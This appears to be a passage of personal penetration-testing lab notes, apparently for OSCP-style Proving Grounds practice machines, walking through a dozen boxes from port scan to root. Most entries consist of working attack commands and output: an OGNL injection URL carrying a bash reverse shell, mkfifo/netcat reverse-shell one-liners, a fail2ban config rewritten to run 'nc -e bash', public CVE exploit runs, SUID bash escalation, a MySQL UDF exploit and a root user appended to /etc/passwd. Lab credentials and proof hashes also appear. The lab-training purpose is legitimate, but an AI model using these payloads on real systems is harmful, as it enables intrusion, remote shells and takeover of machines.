http://192.168.241.41:8090/login.action?os_destination=%2F%24%7Bnew+javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new+java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.155%2F1234+0%3E%261%27%29.start%28%29%22%29%7D%2Findex.action&permissionViolation=true
```

3. Find /opt/log-backu.sh cronfile using pspy64. Rooted adding bash SUID
```
confluence@flu:/opt$ echo "chmod u+s /usr/bin/bash" >> log-backup.sh

bash -p 
```


## Sorcerer
1. Port Scan
```
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
111/tcp   open  rpcbind    syn-ack
2049/tcp  open  nfs        syn-ack
7742/tcp  open  msss       syn-ack
8080/tcp  open  http-proxy syn-ack
38921/tcp open  unknown    syn-ack
39103/tcp open  unknown    syn-ack
40685/tcp open  unknown    syn-ack
54405/tcp open  unknown    syn-ack
```

2. After enumeration, found zip file at http://192.168.241.100:7742/zipfiles/

3. Download max.zip. Figure out scp is working with that keys but ssh is prevented. 

4. Clean up the authorized keys, and copied to the destination. 
```
scp -O -i id_rsa authorized_keys max@192.168.241.100:/home/max/.ssh/authorized_keys
```

5. Ssh connection and foothold. 

7. Rooted with SUID. 
```
max@sorcerer:/tmp$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```

## Fail 

1. Port scan 
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Rsync file upload
```
rsync -av --list-only rsync://192.168.173.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile

ssh-keygen

rsync -av .ssh  rsync://192.168.173.126/fox/ 
```

3. Ssh login and changed fail2ban file config file. 
```
sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc 192.168.118.5 4444 -e /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf
```

4. Fail ssh attempt, get reverse shell
```
 ssh fox@192.168.173.126
fox@192.168.173.126's password: 
Permission denied, please try again

nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.173.126] 36518
SHELL=/bin/bash script -q /dev/null
root@fail:
```

## CVE-2023-33831 
1. Port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
1881/tcp open  http    Node.js Express framework
|_http-cors: GET POST PUT DELETE
|_http-title: FUXA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Run exploit and obtained root. 
```
https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831


python CVE-2023-33831.py --rhost 192.168.200.35 --rport 1881 --lhost 192.168.45.156 --lport 8090
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

listening on [any] 8090 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.200.35] 39560
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

## CVE-2023-40582 
1. Port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; pr
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
3000/tcp open  http    Node.js Express framework
|_http-title: Command Guess Game
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Enter this command for reverse shell and use penelope.py for better shell. 
```
id | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.156 8000 >/tmp/f

./penelope.py 8000  
```

3. Rooted 
```
/penelope.py 8000
[+] Listening for reverse shells on 0.0.0.0 🚪8000 
➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[-] Invalid shell from 192.168.200.36 🙄
[-] Invalid shell from 192.168.200.36 🙄
[+] Got reverse shell from 🐧 192.168.200.36 💀 - Assigned SessionID <3>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [3], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/192.168.200.36/192.168.200.36.log 📜
root@ubuntu:/usr/src/app# ls
index.html  node_modules  package.json  package-lock.json  server.js
root@ubuntu:/usr/src/app# cd /root
root@ubuntu:~# ls
email5.txt  proof.txt  snap
root@ubuntu:~# cat proof.txt
c3590054c94d30766690d03c4cc7c4bb
```

## Flimsy 
1. Nmap 
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open  mysql   MySQL (unauthorized)
43500/tcp open  http    OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found exploit for apisix 2.8 - 50829. Use it to get foothold. 
```
python3 50829.py http://192.168.200.220:43500/ 192.168.45.156 1212

connect to [192.168.45.156] from (UNKNOWN) [192.168.200.220] 45858
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
```

3. Linpeas shows writable /etc/apt/apt.conf.d and cronjob at /etc/crontab. Created new reverse shell file. 
```
* * * * * root apt-get update

franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke{"rm /tmp/f;mkfifo /tmp/f;c -i 2>&1|nc 192.168.45.156 8000 >/tmp/f"};' > shell
```

4. Obtained reverse shell. 
```
root@flimsy:~# cat proof.txt
cat proof.txt
10a69be60365b1d21ba003882be27f16
```

## CVE-2023-6019 
1. Port scan 
```
9000/tcp  open  http    aiohttp 3.9.1 (Python 3.8)
|_http-server-header: Python/3.8 aiohttp/3.9.1
|_http-title: Ray Dashboard
```

2. Found exploit, run it and obtained shell. https://github.com/Clydeston/CVE-2023-6019
```
python3 CVE-2023-6019.py -t 192.168.200.37 -p 9000 -l 192.168.45.156 -lp 4444

nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.200.37] 47584
root@ubuntu:/opt# cd /root
cd /root
root@ubuntu:~# ls
ls
email6.txt  proof.txt  reboot.lock  snap
root@ubuntu:~# cat proof.txt
cat proof.txt
ac31fbb1a0b2eec9cc7ef31ddfa709a5
```

## Bullybox
1. Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-git: 
|   192.168.200.27:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Ready For launch 
|_http-title: Client Area 
| http-robots.txt: 8 disallowed entries 
| /boxbilling/bb-data/ /bb-data/ /bb-library/ 
|_/bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found git sub directory. Then, dump it and check for credentails. 
```
git-dumper http://bullybox.local/.git bullyboxgit

found creds on bb-config 
```

3. Download authenticated exploit and then obtained foothold. 
```
https://github.com/kabir0x23/CVE-2022-3552/

python3 CVE-2022-3552.py -d http://bullybox.local/ -u admin@bullybox.local -p Playing-Unstylish7-Provided

nc -nlvp 1337                  
listening on [any] 1337 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.200.27] 45902
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 05:16:20 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
```

4. Rooted and obtained proof. 
```
yuki@bullybox:/$ sudo su
sudo su
root@bullybox:/#
```

## Zino
1. Port scan
```
Open 192.168.200.64:21
Open 192.168.200.64:22
Open 192.168.200.64:139
Open 192.168.200.64:445
Open 192.168.200.64:3306
Open 192.168.200.64:8003
```

2. Found 'admin:adminadmin' credentials in smb share 'zino' misc.log. 

3. Found exploit - https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF (Booked Scheduler 2.7.5)

4. Upload monkey pentest and obtained foothold. And then found cronjob. /var/www/html/booked/cleanup.py

5. Vi was restrictive so used cat EOF to root. 
```
www-data@zino:/var/www/html/booked$ cat << 'EOT' > /var/www/html/booked/cleanup.py
<ked$ cat << 'EOT' > /var/www/html/booked/cleanup.py
> #!/usr/bin/env python
import os
import sys
try:
        os.system('chmod u+s /usr/bin/bash')
except:
        print 'ERROR...'
sys.exit(0)#!/usr/bin/env python
> import os
> import sys
> try:
>         os.system('chmod u+s /usr/bin/bash')
> except:
>         print 'ERROR...'
> 
sys.exit(0)
> EOT
EOT
```

6. Rooted 'bash -p'

## Walla 
1. Port scan
```
 nmap -A -T4 -p 22,23,25,53,422,8091,42042 192.168.200.97 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 02:50 EDT
Nmap scan report for 192.168.200.97
Host is up (0.098s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCMIME, DSN, SMTPUTF8, CHUNKING
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-server-header: lighttpd/1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found default credentials for raspap 'admin:secret'. Found terminal (console) at system. Use it to get reverse shell. 

3. Obtained foothold. User have sudo python permission on some files. 
```
www-data@walla:/home/walter$ sudo -l
sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/us

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

4. Change 'wifi_reset.py' with Gitfobin SUDO command. Obtained root. 
```
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
sudo /usr/bin/python /home/walter/wifi_reset.py
www-data@walla:/home/walter$ bash -p
bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
cd /root
cat proof.txt
a32fb08139aa1d54a96cf2c484ddeb4a
```

## Quackerjack
1. Port scan
```
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack
22/tcp   open  ssh             syn-ack
80/tcp   open  http            syn-ack
111/tcp  open  rpcbind         syn-ack
139/tcp  open  netbios-ssn     syn-ack
445/tcp  open  microsoft-ds    syn-ack
3306/tcp open  mysql           syn-ack
8081/tcp open  blackice-icecap syn-ack
```

2. Found a webpage - https://quackerjack:8081/

3. Found a exploit which helps for sql query for user creds. 
```
rConfig 3.9 - 'searchColumn' SQL Injection

python3 48208.py https://quackerjack:8081/  

admin:1:dc40b85276a1f4d7cb35f154236aa1b2

admin:abgrtyu
```

4. Use authenticated RCE exploit. 
```
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection

python3 48241.py https://quackerjack:8081/ admin abgrtyu 192.168.45.156 80   

nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.200.57] 34740
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

5. Rooted with find SUID. 

## Sirol
1. Port scan
```
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:88:cb:33:78:9a:bf:f0:31:57:d9:2f:ae:13:ee:db (RSA)
|   256 fb:54:3b:ba:f6:68:57:81:e4:65:6e:24:9c:db:6d:8a (ECDSA)
|_  256 be:6e:25:d1:88:09:7e:33:40:b3:56:6a:b4:ce:16:0d (ED25519)
80/tcp    open  http      Apache httpd 2.4.25 ((Debian))
|_http-title: PHP Calculator
|_http-server-header: Apache/2.4.25 (Debian)
3306/tcp  open  mysql     MariaDB (unauthorized)
5601/tcp  open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Fri, 17 May 2024 10:24:02 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Fri, 17 May 2024 10:23:59 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Fri, 17 May 2024 10:23:59 GMT
|_    {"statusCode":404,"error":"Not Found"}
24007/tcp open  rpcbind
```

2. Found kibana exploit and obtained foothold. 
```
python2 CVE-2019-7609-kibana-rce.py -u http://192.168.200.54:5601/ -host 192.168.45.156 -port 1234 --shell

nc -nlvp 1234   
listening on [any] 1234 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.200.54] 53266
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@0873e8062560:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

3. Found local.txt. Figured out we at docker so, mounting file to read proof.txt
```
root@0873e8062560:/# mkdir /mnt/own
mkdir /mnt/own
root@0873e8062560:/# mount /dev/sda1 /mnt/own

root@0873e8062560:/mnt/own/root# cat proof.txt
cat proof.txt
0d905e33ae5cad110119ca5c345172ab
```

4. We can mount new ssh file under root to ssh and root, so that we can direct access to machine which is not in docker. 

## Nickel
1. Port scan 
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-17T11:01:48+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2024-03-22T08:59:47
|_Not valid after:  2024-09-21T08:59:47
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2024-05-17T11:00:37+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Follow up redirect link with burp. Found creds. 
```
curl -X POST http://nickel:33333/list-running-procs -H 'COntent-Length: 0'

commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

3. SSH login. Found local.txt
```
ssh ariah@192.168.200.99                               
ariah@192.168.200.99's password:
```

4. Found pdf file and crack it. 
```
──(kali㉿kali)-[~/OSCP/pg/practice]
└─$ pdf2john Infrastructure.pdf > pdfhash
                                                                                                 
┌──(kali㉿kali)-[~/OSCP/pg/practice]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pdfhash 
ariah4168        (Infrastructure.pdf) 
```

5. Found port 80 running http so, use it to root. 
```
PS C:\Users\ariah> $Resp = Invoke-WebRequest 'http://localhost/?whoami' -UseBasicParsing   
PS C:\Users\ariah> $Resp.RawContent

PS C:\Users\ariah> net localgroup Administrators

ssh login and check proof.txt
```

## Banzai
1. Nmap 
```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open  postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
8295/tcp open  http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found default password for ftp admin:admin. Add monkey pentest reverse shell. Obtained foothold at port 21. 
```
nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.224.56] 34066
Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
 20:03:51 up 3 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
www-data@banzai:
```

3. Found 'Linux Privilege Escalation – Exploiting User-Defined Functions' vulnerability. 
```
ps aux | grep mysql
ps aux | grep mysql
root       696  0.0  8.8 1128228 181140 ?      Sl   20:00   0:00 /usr/sbin/mysqld --daemonizid-file=/var/run/mysqld/mysqld.pid
root      1551  0.0  0.0  12780  1020 pts/0    S+   20:12   0:00 grep mysql
```

4. Exploitation, giving writable permission to passwd at the end. 
```
www-data@banzai:/var/www$ wget http://192.168.45.189:21/1518.c
www-data@banzai:/var/www$ gcc -g -c 1518.c -o raptor_udf2.o -fPIC
www-data@banzai:/var/www$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

www-data@banzai:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: EscalateRaftHubris123 (from config.php)

mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/var/www/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> show variables like '%plugin%';
mysql> select do_system('chmod 777 /etc/passwd');
```

4. Rooted by adding new root user at /etc/passwd. 
```
www-data@banzai:/$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
www-data@banzai:/$ su root2
su root2
Password: w00t

root@banzai:/# 
```